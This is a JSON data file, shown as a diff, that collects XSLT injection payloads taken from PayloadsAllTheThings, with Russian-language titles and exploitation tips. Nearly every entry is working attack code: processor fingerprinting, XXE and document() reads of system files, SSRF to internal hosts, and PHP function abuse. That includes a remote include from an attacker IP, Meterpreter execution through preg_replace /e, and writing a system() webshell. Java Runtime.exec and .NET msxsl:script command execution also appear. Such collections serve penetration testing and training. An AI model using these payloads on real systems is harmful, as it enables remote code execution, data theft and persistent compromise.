@@ -1,0 +1,152 @@
+{
+  "category": "XSLT Injection",
+  "source": "PayloadsAllTheThings/XSLT Injection/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое XSLT-инъекция",
+      "language": "text",
+      "tags": ["methodology", "xslt"],
+      "body": "Обработка непроверенного XSL-таблицы стилей позволяет атакующему изменить структуру и содержимое результирующего XML, подключить произвольные файлы с файловой системы или выполнить код.\nИщи места, где приложение принимает или собирает .xsl / .xslt стили: генерация PDF, отчётов, экспорт XML, рендеринг по xml-stylesheet.\nГотовых тулз для эксплуатации XSLT практически нет — работаем руками."
+    },
+    {
+      "subcategory": "Определение процессора",
+      "title": "Определение вендора и версии (через system-property)",
+      "language": "xml",
+      "tags": ["detection", "fingerprint", "system-property"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n<xsl:template match=\"/\">\n<p>\nVersion: <xsl:value-of select=\"system-property('xsl:version')\" /> <br />\nVendor: <xsl:value-of select=\"system-property('xsl:vendor')\" /> <br />\nVendor URL: <xsl:value-of select=\"system-property('xsl:vendor-url')\" />\n</p>\n</xsl:template>\n</xsl:stylesheet>",
+      "meta": {
+        "tip": "Первый шаг: узнаём вендора и версию процессора. От этого зависит набор доступных техник (PHP, Xalan/Java, Saxon, libxslt, .NET MSXML)."
+      }
+    },
+    {
+      "subcategory": "Определение процессора",
+      "title": "Определение вендора через HTML-обёртку (xsl:version в html)",
+      "language": "xml",
+      "tags": ["detection", "fingerprint", "php"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\">\n<body>\n<br />Version: <xsl:value-of select=\"system-property('xsl:version')\" />\n<br />Vendor: <xsl:value-of select=\"system-property('xsl:vendor')\" />\n<br />Vendor URL: <xsl:value-of select=\"system-property('xsl:vendor-url')\" />\n</body>\n</html>"
+    },
+    {
+      "subcategory": "Определение процессора",
+      "title": "Запуск преобразования (system-properties.xml)",
+      "language": "xml",
+      "tags": ["detection", "xml", "stylesheet"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<?xml-stylesheet href=\"system-properties.xsl\" type=\"text/xsl\"?>  \n<root/>",
+      "meta": {
+        "tip": "XML-документ, который подключает таблицу стилей через xml-stylesheet и запускает преобразование — так проверяют связку XML + XSL."
+      }
+    },
+    {
+      "subcategory": "Чтение файлов",
+      "title": "External Entity (XXE) внутри XSLT",
+      "language": "xml",
+      "tags": ["xxe", "file-read", "entity"],
+      "body": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM \"C:\\secretfruit.txt\">]>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n  <xsl:template match=\"/fruits\">\n    Fruits &ext_file;:\n    <!-- Loop for each fruit -->\n    <xsl:for-each select=\"fruit\">\n      <!-- Print name: description -->\n      - <xsl:value-of select=\"name\"/>: <xsl:value-of select=\"description\"/>\n    </xsl:for-each>\n  </xsl:template>\n</xsl:stylesheet>",
+      "meta": {
+        "tip": "Не забывай проверять XXE, когда встречаешь XSLT-файлы — DOCTYPE/ENTITY часто остаются доступны."
+      }
+    },
+    {
+      "subcategory": "Чтение файлов",
+      "title": "Чтение файлов и SSRF через document()",
+      "language": "xml",
+      "tags": ["file-read", "ssrf", "document"],
+      "body": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n  <xsl:template match=\"/fruits\">\n    <xsl:copy-of select=\"document('http://172.16.132.1:25')\"/>\n    <xsl:copy-of select=\"document('/etc/passwd')\"/>\n    <xsl:copy-of select=\"document('file:///c:/winnt/win.ini')\"/>\n    Fruits:\n\t    <!-- Loop for each fruit -->\n    <xsl:for-each select=\"fruit\">\n      <!-- Print name: description -->\n      - <xsl:value-of select=\"name\"/>: <xsl:value-of select=\"description\"/>\n    </xsl:for-each>\n  </xsl:template>\n</xsl:stylesheet>",
+      "meta": {
+        "tip": "document() умеет ходить и по http (SSRF на внутренние хосты/порты), и по file:// или абсолютному пути (чтение файлов)."
+      }
+    },
+    {
+      "subcategory": "RCE — PHP",
+      "title": "PHP — чтение файла через readfile",
+      "language": "xml",
+      "tags": ["rce", "php", "file-read"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\">\n<body>\n<xsl:value-of select=\"php:function('readfile','index.php')\" />\n</body>\n</html>",
+      "meta": {
+        "tip": "Если PHP запущен с registerPHPFunctions, неймспейс php:function вызывает произвольные PHP-функции. Сначала — readfile/scandir для разведки."
+      }
+    },
+    {
+      "subcategory": "RCE — PHP",
+      "title": "PHP — листинг каталога через scandir",
+      "language": "xml",
+      "tags": ["rce", "php", "scandir"],
+      "body": "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\">\n  <xsl:template match=\"/\">\n    <xsl:value-of name=\"assert\" select=\"php:function('scandir', '.')\"/>\n  </xsl:template>\n</xsl:stylesheet>"
+    },
+    {
+      "subcategory": "RCE — PHP",
+      "title": "PHP — подключение удалённого php-файла через assert",
+      "language": "xml",
+      "tags": ["rce", "php", "assert"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\">\n<body style=\"font-family:Arial;font-size:12pt;background-color:#EEEEEE\">\n    <xsl:variable name=\"payload\">\n        include(\"http://10.10.10.10/test.php\")\n    </xsl:variable>\n    <xsl:variable name=\"include\" select=\"php:function('assert',$payload)\"/>\n</body>\n</html>"
+    },
+    {
+      "subcategory": "RCE — PHP",
+      "title": "PHP — meterpreter через preg_replace /e",
+      "language": "xml",
+      "tags": ["rce", "php", "meterpreter"],
+      "body": "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\">\n  <xsl:template match=\"/\">\n    <xsl:variable name=\"eval\">\n      eval(base64_decode('Base64-encoded Meterpreter code'))\n    </xsl:variable>\n    <xsl:variable name=\"preg\" select=\"php:function('preg_replace', '/.*/e', $eval, '')\"/>\n  </xsl:template>\n</xsl:stylesheet>",
+      "meta": {
+        "tip": "Модификатор /e у preg_replace выполняет замену как PHP-код (устаревший, но встречается на старых версиях PHP < 7)."
+      }
+    },
+    {
+      "subcategory": "RCE — PHP",
+      "title": "PHP — запись вебшелла через file_put_contents",
+      "language": "xml",
+      "tags": ["rce", "php", "webshell", "file-write"],
+      "body": "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\">\n  <xsl:template match=\"/\">\n    <xsl:value-of select=\"php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')\" />\n  </xsl:template>\n</xsl:stylesheet>"
+    },
+    {
+      "subcategory": "RCE — Java",
+      "title": "Java/Xalan — выполнение команды через java.lang.Runtime",
+      "language": "xml",
+      "tags": ["rce", "java", "xalan"],
+      "body": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\">\n  <xsl:template match=\"/\">\n    <xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/>\n    <xsl:variable name=\"process\" select=\"rt:exec($rtobject,'ls')\"/>\n    <xsl:variable name=\"processString\" select=\"ob:toString($process)\"/>\n    <xsl:value-of select=\"$processString\"/>\n  </xsl:template>\n</xsl:stylesheet>",
+      "meta": {
+        "tip": "Xalan-Java мапит Java-классы в неймспейсы вида .../xalan/java/<полное.имя.класса>. Так дотягиваемся до Runtime.exec()."
+      }
+    },
+    {
+      "subcategory": "RCE — Java",
+      "title": "Java/Saxon — выполнение команды (XSLT 2.0)",
+      "language": "xml",
+      "tags": ["rce", "java", "saxon"],
+      "body": "<xml version=\"1.0\"?>\n<xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:java=\"http://saxon.sf.net/java-type\">\n<xsl:template match=\"/\">\n<xsl:value-of select=\"Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')\" xmlns:Runtime=\"java:java.lang.Runtime\"/>\n</xsl:template>.\n</xsl:stylesheet>"
+    },
+    {
+      "subcategory": "RCE — .NET",
+      "title": ".NET — msxsl:script (Process.Start)",
+      "language": "xml",
+      "tags": ["rce", "dotnet", "msxsl"],
+      "body": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:App=\"http://www.tempuri.org/App\">\n    <msxsl:script implements-prefix=\"App\" language=\"C#\">\n      <![CDATA[\n        public string ToShortDateString(string date)\n          {\n              System.Diagnostics.Process.Start(\"cmd.exe\");\n              return \"01/01/2001\";\n          }\n      ]]>\n    </msxsl:script>\n    <xsl:template match=\"ArrayOfTest\">\n      <TABLE>\n        <xsl:for-each select=\"Test\">\n          <TR>\n          <TD>\n            <xsl:value-of select=\"App:ToShortDateString(TestDate)\" />\n          </TD>\n          </TR>\n        </xsl:for-each>\n      </TABLE>\n    </xsl:template>\n</xsl:stylesheet>",
+      "meta": {
+        "tip": "MSXML/.NET позволяет встраивать C# прямо в msxsl:script. Внутри CDATA доступен весь System.Diagnostics.Process."
+      }
+    },
+    {
+      "subcategory": "RCE — .NET",
+      "title": ".NET — msxsl:script с захватом вывода команды",
+      "language": "xml",
+      "tags": ["rce", "dotnet", "msxsl"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\nxmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\nxmlns:user=\"urn:my-scripts\">\n\n<msxsl:script language = \"C#\" implements-prefix = \"user\">\n<![CDATA[\npublic string execute(){\nSystem.Diagnostics.Process proc = new System.Diagnostics.Process();\nproc.StartInfo.FileName= \"C:\\\\windows\\\\system32\\\\cmd.exe\";\nproc.StartInfo.RedirectStandardOutput = true;\nproc.StartInfo.UseShellExecute = false;\nproc.StartInfo.Arguments = \"/c dir\";\nproc.Start();\nproc.WaitForExit();\nreturn proc.StandardOutput.ReadToEnd();\n}\n]]>\n</msxsl:script>\n\n  <xsl:template match=\"/fruits\">\n  --- BEGIN COMMAND OUTPUT ---\n\t<xsl:value-of select=\"user:execute()\"/>\n  --- END COMMAND OUTPUT ---\t\n  </xsl:template>\n</xsl:stylesheet>"
+    },
+    {
+      "subcategory": "Запись файлов",
+      "title": "Запись файла через EXSLT-расширение (exsl:document)",
+      "language": "xml",
+      "tags": ["file-write", "exslt"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<xsl:stylesheet\n        xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n    xmlns:exploit=\"http://exslt.org/common\"\n    extension-element-prefixes=\"exploit\"\n    version=\"1.0\">\n<xsl:template match=\"/\">\n\n<exploit:document href=\"evil.txt\" method=\"text\">\n        Hello World!\n</exploit:document>\n\n</xsl:template>\n</xsl:stylesheet>",
+      "meta": {
+        "tip": "EXSLT — набор расширений XSLT. Элемент exsl:document (http://exslt.org/common) умеет писать произвольные файлы на диск, что даёт запись вебшелла."
+      }
+    },
+    {
+      "subcategory": "Лабы",
+      "title": "Где потренироваться",
+      "language": "text",
+      "tags": ["labs", "practice"],
+      "body": "Root Me — XSLT - Code execution: https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution"
+    }
+  ]
+}
